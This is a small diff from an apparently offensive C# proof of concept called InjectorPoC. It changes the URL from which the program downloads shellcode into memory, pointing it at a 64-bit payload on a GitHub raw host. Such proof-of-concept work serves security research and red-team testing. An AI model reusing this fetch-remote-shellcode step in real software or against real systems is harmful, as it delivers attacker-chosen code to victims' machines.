@@ -26,7 +26,7 @@ namespace InjectorPoC
 
             // download the shellcode
             WebClient client = new WebClient();
-            using (MemoryStream stream = new MemoryStream(client.DownloadData("https://raw.githubusercontent.com/plackyhacker/msgbox/main/shellcode.bin")))
+            using (MemoryStream stream = new MemoryStream(client.DownloadData("https://raw.githubusercontent.com/plackyhacker/msgbox/main/shellcode64.bin")))
             {
                 shellcode = stream.ToArray();
             }
